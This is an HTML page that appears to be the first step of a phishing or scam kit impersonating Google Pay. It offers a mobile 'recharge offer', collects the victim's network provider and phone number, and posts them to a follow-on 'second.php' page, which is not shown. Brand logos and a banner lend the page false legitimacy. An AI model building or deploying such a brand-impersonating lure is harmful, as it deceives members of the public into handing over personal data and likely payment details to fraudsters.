<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Pay Recharge Offer</title>
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <!-- Logo Section -->
  <header>
    <img src="images/logo.png" alt="Google Pay" class="logo">
  </header>

  <!-- Main Banner -->
  <section class="offer-banner">
    <img src="images/recharge_offer_banner.png" alt="Recharge Offer Banner">
  </section>

  <!-- Mobile Recharge Form -->
  <section class="recharge-form">
    <h3>Mobile Recharge</h3>
    <form action="second.php" method="post">
      <label for="provider">Select Network Provider:</label><br>
      <input type="radio" id="jio" name="provider" value="Jio"> Jio
      <input type="radio" id="airtel" name="provider" value="Airtel"> Airtel
      <input type="radio" id="vi" name="provider" value="VI"> VI
      <input type="radio" id="bsnl" name="provider" value="BSNL"> BSNL<br><br>

      <label for="mobile">Mobile Number:</label><br>
      <input type="text" id="mobile" name="mobile" placeholder="+91 XXXXXXXXXX"><br><br>

      <input type="submit" value="Recharge">
    </form>
  </section>

  <!-- Footer -->
  <footer>
    <img src="images/google_pay_footer.webp" alt="Google Pay Footer">
  </footer>
</body>

</html>